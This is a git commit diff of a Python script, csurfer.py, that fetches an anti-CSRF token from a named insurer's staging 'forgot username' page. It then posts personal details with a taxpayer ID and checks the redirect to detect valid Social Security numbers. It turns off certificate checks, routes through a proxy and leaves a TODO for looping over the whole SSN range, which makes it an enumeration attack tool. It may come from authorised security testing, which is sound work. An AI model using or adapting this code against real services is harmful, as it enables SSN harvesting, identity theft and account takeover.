2de476ba707256ee0dff540ef57c9365e1beb0de
Matthew Lange <matthew.lange4@gmail.com>
2016-07-29 13:37:50 -0500

    it works!

--- csurfer.py
+++ csurfer.py
@@ -13,19 +13,41 @@ except ImportError, e:
 	exit(1)
 
 # establish vars
-url = 'http://127.0.0.1:8000/'
-token_header = 'Content-type'
-data = {}
+url = 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
+token = str()
+proxies = { 'https': 'http://172.21.22.204:8080' }	#for testing
+# TODO: this causes a python 'MemoryError' ssn = range(111111111, 888888888) 
 
-# establish session
-s = requests.Session()
+def get_token():
+    global token
+    global s
+    # establish session
+    s = requests.Session()
+    # make initial request to get token
+    gr = s.get(url, proxies=proxies, verify=False)
+    # access response and retrieve anti-csurf token
+    tree = lh.fromstring(gr.content)
+    token = tree.xpath('//input[@name="org.apache.struts.taglib.html.TOKEN"]/@value')[0]
+    return token, s
 
-# make initial request to get token
-r = s.get(url)
+# POST SSN request with token
+## TODO: add ssn range as argument to post_ssn function
+def post_ssn():
+    global location
+    global pr
+    pr = s.post(url, data=data, proxies=proxies, verify=False, allow_redirects=False) 
+    try:
+        location = pr.headers['Location']
+        if location != 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameFailure.do':
+            print 'SSN found: ' ## TODO add in with argument ## %s' %(ssn)
+        else:
+            return location
+    except:
+        location = "No 'Location' Header was returned by the server"
+        return pr
 
-#print(r.text)
-#token = r.headers[token_header]
-tree = lh.fromstring(r.content)
-html = tree.xpath('//a[@href]/text()')
-print html
-# make second request with token
+if not token:
+    get_token()
+data = {'org.apache.struts.taglib.html.TOKEN':token, 'firstName':'matt', 'lastName':'lange', 'clientDOB':'1%2F1%2F2000','taxPayerId':'123456789', 'emailAddress':'matt%40matt.com'}
+post_ssn() 
+print location
